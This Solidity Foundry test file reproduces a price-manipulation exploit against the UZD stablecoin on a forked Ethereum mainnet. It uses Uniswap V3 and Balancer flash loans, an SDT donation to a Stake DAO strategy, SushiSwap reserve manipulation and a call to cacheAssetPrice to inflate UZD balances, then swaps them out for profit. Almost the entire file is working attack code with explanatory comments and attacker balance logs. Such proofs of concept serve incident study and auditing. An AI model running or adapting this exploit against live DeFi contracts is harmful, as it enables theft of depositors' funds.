// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

/**
 * @title ContractTest
 * @dev This contract is a proof of concept for a potential exploit scenario.
 */

interface IUZD is IERC20 {
    function cacheAssetPrice() external;
}

interface ICurve {
    function exchange(
        uint256 i,
        uint256 j,
        uint256 dx,
        uint256 min_dy,
        bool use_eth,
        address receiver
    ) external returns (uint256);
}

contract ContractTest is Test {
    // Token and interface declarations
    IUZD public UZD;
    IERC20 public WETH;
    IERC20 public USDC;
    IERC20 public crvUSD;
    IERC20 public crvFRAX;
    IERC20 public USDT;
    IERC20 public SDT;
    IERC20 public FRAX;
    ICurvePool public FRAX_USDC_POOL;
    ICurvePool public UZD_crvFRAX_POOL;
    ICurvePool public crvUSD_USDC_POOL;
    ICurvePool public crvUSD_UZD_POOL;
    ICurvePool public Curve3POOL;
    ICurve public ETH_SDT_POOL;
    Uni_Router_V2 public sushiRouter;
    Uni_Pair_V3 public USDC_WETH_Pair;
    Uni_Pair_V3 public USDC_USDT_Pair;
    IBalancerVault public Balancer;
    address public MIMCurveStakeDao;

    // Constructor to initialize addresses
    constructor() {
        UZD = IUZD(0xb40b6608B2743E691C9B54DdBDEe7bf03cd79f1c);
        WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
        USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
        crvUSD = IERC20(0xf939E0A03FB07F59A73314E73794Be0E57ac1b4E);
        crvFRAX = IERC20(0x3175Df0976dFA876431C2E9eE6Bc45b65d3473CC);
        USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
        SDT = IERC20(0x73968b9a57c6E53d41345FD57a6E6ae27d6CDB2F);
        FRAX = IERC20(0x853d955aCEf822Db058eb8505911ED77F175b99e);
        FRAX_USDC_POOL = ICurvePool(0xDcEF968d416a41Cdac0ED8702fAC8128A64241A2);
        UZD_crvFRAX_POOL = ICurvePool(0x68934F60758243eafAf4D2cFeD27BF8010bede3a);
        crvUSD_USDC_POOL = ICurvePool(0x4DEcE678ceceb27446b35C672dC7d61F30bAD69E);
        crvUSD_UZD_POOL = ICurvePool(0xfC636D819d1a98433402eC9dEC633d864014F28C);
        Curve3POOL = ICurvePool(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7);
        ETH_SDT_POOL = ICurve(0xfB8814D005C5f32874391e888da6eB2fE7a27902);
        sushiRouter = Uni_Router_V2(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
        USDC_WETH_Pair = Uni_Pair_V3(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640);
        USDC_USDT_Pair = Uni_Pair_V3(0x3416cF6C708Da44DB2624D63ea0AAef7113527C6);
        Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        MIMCurveStakeDao = 0x9848EDb097Bee96459dFf7609fb582b80A8F8EfD;
    }

    // Setup function for Foundry VM
    function setUp() public {
        vm.createSelectFork("mainnet", 17_908_908);
        vm.label(address(WETH), "WETH");
        vm.label(address(USDC), "USDC");
        vm.label(address(UZD), "UZD");
        vm.label(address(crvUSD), "crvUSD");
        vm.label(address(crvFRAX), "crvFRAX");
        vm.label(address(USDT), "USDT");
        vm.label(address(SDT), "SDT");
        vm.label(address(FRAX), "FRAX");
        vm.label(address(FRAX_USDC_POOL), "FRAX_USDC_POOL");
        vm.label(address(UZD_crvFRAX_POOL), "UZD_crvFRAX_POOL");
        vm.label(address(crvUSD_USDC_POOL), "crvUSD_USDC_POOL");
        vm.label(address(crvUSD_UZD_POOL), "crvUSD_UZD_POOL");
        vm.label(address(Curve3POOL), "Curve3POOL");
        vm.label(address(ETH_SDT_POOL), "ETH_SDT_POOL");
        vm.label(address(sushiRouter), "sushiRouter");
        vm.label(address(USDC_WETH_Pair), "USDC_WETH_Pair");
        vm.label(address(USDC_USDT_Pair), "USDC_USDT_Pair");
        vm.label(address(Balancer), "Balancer");
        vm.label(address(MIMCurveStakeDao), "MIMCurveStakeDao");
    }


    function testExploit() external {
        USDC_USDT_Pair.flash(address(this), 0, 7_000_000 * 1000000, abi.encode(7_000_000 * 1000000));

        emit log_named_decimal_uint(
            "Attacker WETH balance after exploit", WETH.balanceOf(address(this)), WETH.decimals()
        );

        emit log_named_decimal_uint(
            "Attacker USDT balance after exploit", USDT.balanceOf(address(this)), USDT.decimals()
        );
    }

        function uniswapV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external {
        BalancerFlashLoan();

        uint256 amount = abi.decode(data, (uint256));
        TransferHelper.safeTransfer(address(USDT), address(USDC_USDT_Pair), amount1 + amount);
    }

function BalancerFlashLoan() internal {
    // Define the tokens for the flash loan
    address[] memory tokens = new address[](2);
    tokens[0] = address(USDC);
    tokens[1] = address(WETH);

    // Define the amounts for each token
    uint256[] memory amounts = new uint256[](2);
    amounts[0] = 7000000 * 1000000; // 7 million USDC, represented with 6 decimals
    amounts[1] = 10011 ether;      // 10,011 WETH, represented with 18 decimals

    // User data can be used to pass additional information to the flash loan callback
    bytes memory userData = "";

    // Execute the flash loan on the Balancer contract
    Balancer.flashLoan(address(this), tokens, amounts, userData);
}


        // Balancer flashloan callback
    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        approveAll();

        uint256[2] memory amount;
        amount[0] = 0;
        amount[1] = 5_750_000 * 1000000;
        uint256 crvFRAXBalance = FRAX_USDC_POOL.add_liquidity(amount, 0); // mint crvFRAX

        UZD_crvFRAX_POOL.exchange(1, 0, crvFRAXBalance, 0, address(this)); // swap crvFRAX to UZD

        crvUSD_USDC_POOL.exchange(0, 1, 1_250_000 * 1000000, 0, address(this)); // swap USDC to crvUSD

        crvUSD_UZD_POOL.exchange(1, 0, crvUSD.balanceOf(address(this)), 0, address(this)); // swap crvUSD to UZD

        ETH_SDT_POOL.exchange(0, 1, 11 ether, 0, false, address(this)); // swap WETH to SDT

        // Vulnerability Insight:
        // The UZD's balanceOf method's return value can be artificially manipulated by:
        // 1. Calculating the total SDT amount in MIMCurveStakeDao: sdtEarned + _config.sdt.balanceOf(address(this))
        // 2. Determining the SDT's equivalent value in the fee token using the sushi router's getAmountsOut method. The conversion path used is: SDT -> WETH -> USDT

        emit log_named_decimal_uint(
             "UZD Balance BEFORE Making Donation and Reserves", 
            UZD.balanceOf(address(this)), WETH.decimals()
        );
        SDT.transfer(MIMCurveStakeDao, SDT.balanceOf(address(this))); // donate SDT to MIMCurveStakeDao, inflate UZD balance
        // Execute token swaps to further manipulate reserves and prices.
       
               // Convert WETH to SDT using SushiSwap.
        swapToken1Totoken2(WETH, SDT, 10_000 ether); 

        // Convert USDT to WETH using SushiSwap.
        uint256 value = swapToken1Totoken2(USDT, WETH, 7_000_000 * 1000000); 

        // Update UZD's internal price cache.
        UZD.cacheAssetPrice(); 

        emit log_named_decimal_uint(
             "UZD Balance AFTER Making Donation and Reserves", 
            UZD.balanceOf(address(this)), WETH.decimals()
        );

        // Convert SDT back to WETH.
        swapToken1Totoken2(SDT, WETH, SDT.balanceOf(address(this))); 

        // Convert WETH back to USDT.
        swapToken1Totoken2(WETH, USDT, value); 

        // Swap a portion of UZD for crvFRAX.
        UZD_crvFRAX_POOL.exchange(0, 1, UZD.balanceOf(address(this)) * 84 / 100, 0, address(this)); 

        // Swap remaining UZD for crvUSD.
        crvUSD_UZD_POOL.exchange(0, 1, UZD.balanceOf(address(this)), 0, address(this)); 

        // Redeem crvFRAX for underlying assets.
        FRAX_USDC_POOL.remove_liquidity(crvFRAX.balanceOf(address(this)), [uint256(0), uint256(0)]); 

        // Swap FRAX for USDC.
        FRAX_USDC_POOL.exchange(0, 1, FRAX.balanceOf(address(this)), 0); 

        // Swap crvUSD for USDC.
        crvUSD_USDC_POOL.exchange(1, 0, crvUSD.balanceOf(address(this)), 0, address(this)); 

        // Swap USDC for USDT within the 3Pool.
        Curve3POOL.exchange(1, 2, 25_920 * 1000000, 0); 

        uint256 swapAmount = USDC.balanceOf(address(this)) - amounts[0];
        
        // Swap USDC for WETH using Uniswap V3.
        USDC_WETH_Pair.swap(address(this), true, int256(swapAmount), 920_316_691_481_336_325_637_286_800_581_326, ""); 
        // Transfer the borrowed assets plus fees back to the Balancer Vault.
        IERC20(tokens[0]).transfer(msg.sender, amounts[0] + feeAmounts[0]);
        IERC20(tokens[1]).transfer(msg.sender, amounts[1] + feeAmounts[1]);
    }

    function approveAll() internal {
        // Approve the FRAX/USDC pool to spend USDC.
        USDC.approve(address(FRAX_USDC_POOL), type(uint256).max);

        // Approve the UZD/crvFRAX pool to spend crvFRAX.
        crvFRAX.approve(address(UZD_crvFRAX_POOL), type(uint256).max);

        // Approve the UZD/crvFRAX pool to spend UZD.
        UZD.approve(address(UZD_crvFRAX_POOL), type(uint256).max);

        // Approve the crvUSD/USDC pool to spend USDC.
        USDC.approve(address(crvUSD_USDC_POOL), type(uint256).max);

        // Approve the crvUSD/USDC pool to spend crvUSD.
        crvUSD.approve(address(crvUSD_USDC_POOL), type(uint256).max);

        // Approve the crvUSD/UZD pool to spend crvUSD.
        crvUSD.approve(address(crvUSD_UZD_POOL), type(uint256).max);

        // Approve the crvUSD/UZD pool to spend UZD.
        UZD.approve(address(crvUSD_UZD_POOL), type(uint256).max);

        // Approve the ETH/SDT pool to spend WETH.
        WETH.approve(address(ETH_SDT_POOL), type(uint256).max);

        // Approve the Curve 3Pool to spend USDC.
        USDC.approve(address(Curve3POOL), type(uint256).max);

        // Approve the USDC/WETH Uniswap V3 pair to spend USDC.
        USDC.approve(address(USDC_WETH_Pair), type(uint256).max);

        // Approve SushiSwap to spend WETH.
        WETH.approve(address(sushiRouter), type(uint256).max);

        // Approve SushiSwap to spend SDT.
        SDT.approve(address(sushiRouter), type(uint256).max);

        // Approve SushiSwap to spend USDT.
        TransferHelper.safeApprove(address(USDT), address(sushiRouter), type(uint256).max);

        // Approve the FRAX/USDC pool to spend FRAX.
        FRAX.approve(address(FRAX_USDC_POOL), type(uint256).max);
    }

    function swapToken1Totoken2(IERC20 token1, IERC20 token2, uint256 amountIn) internal returns (uint256) {
        // Define the path for the token swap.
        address[] memory path = new address[](2);
        path[0] = address(token1);
        path[1] = address(token2);

        // Execute the token swap using SushiSwap and return the output amount.
        uint256[] memory values = sushiRouter.swapExactTokensForTokens(amountIn, 0, path, address(this), block.timestamp);
        return values[1];
    }

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {
        // Transfer the required amount of USDC to the Uniswap V3 pair.
        USDC.transfer(msg.sender, uint256(amount0Delta));
    }
}



